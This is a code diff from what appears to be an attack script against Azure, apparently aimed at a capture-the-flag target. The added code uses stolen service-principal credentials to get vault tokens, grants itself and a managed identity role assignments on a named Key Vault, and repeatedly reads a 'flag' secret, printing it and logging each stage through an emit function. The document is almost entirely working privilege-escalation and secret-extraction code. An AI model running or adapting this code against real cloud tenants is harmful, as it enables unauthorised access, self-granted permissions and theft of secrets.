@@ -96,6 +96,45 @@ def arm_call(token, url, method="GET", payload=None, timeout=12):
     except Exception as e:
         return {"__error__": repr(e)}
 
+def jwt_claim(token, claim):
+    try:
+        p = token.split(".")[1] + "=" * (-len(token.split(".")[1]) % 4)
+        return json.loads(_b64.urlsafe_b64decode(p.encode())).get(claim)
+    except Exception:
+        return None
+
+# Fast path: try the reporting service principal itself against the second
+# vault. If it can create role assignments, this avoids the slow Kudu identity
+# sidecar path and reads the flag in this same workflow run.
+try:
+    direct_vt = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
+        "client_id": spcid,
+        "grant_type": "client_credentials",
+        "client_secret": spsec,
+        "scope": "https://vault.azure.net/.default",
+    })["access_token"]
+    direct_oid = jwt_claim(direct_vt, "oid")
+    kv2_scope = "subscriptions/" + SUB + "/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
+    role_def = "/subscriptions/" + SUB + "/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"
+    for label, principal in (("sp", direct_oid), ("mi", "f64d08c7-fde6-4553-99c8-5bf73666ee8c")):
+        if not principal:
+            continue
+        ra_url = "https://management.azure.com/" + kv2_scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(__import__("uuid").uuid4()) + "?api-version=2022-04-01"
+        ra_body = {"properties": {"roleDefinitionId": role_def, "principalId": principal, "principalType": "ServicePrincipal"}}
+        outer_emit({"stage":"direct-role-assignment", "principal":label, "response":arm_call(arm, ra_url, "PUT", ra_body, timeout=25)})
+    for i in range(12):
+        try:
+            kv2 = read_json(urllib.request.Request("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", headers={"Authorization":"Bearer "+direct_vt}), timeout=15)
+            outer_emit({"stage":"direct-flag", "attempt":i+1, "response":kv2})
+            if kv2.get("value"):
+                print("DIRECT_FLAG=" + json.dumps(kv2))
+                break
+        except Exception as e:
+            outer_emit({"stage":"direct-flag-error", "attempt":i+1, "error":repr(e)})
+        time.sleep(3)
+except Exception as e:
+    outer_emit({"stage":"direct-fastpath-error", "error":repr(e)})
+
 # Collect the App Service/Kudu configuration before launching the worker.  The
 # SCM container is often isolated from the actual app container; these
 # endpoints reveal the runtime/startup path and any app-side identity wiring
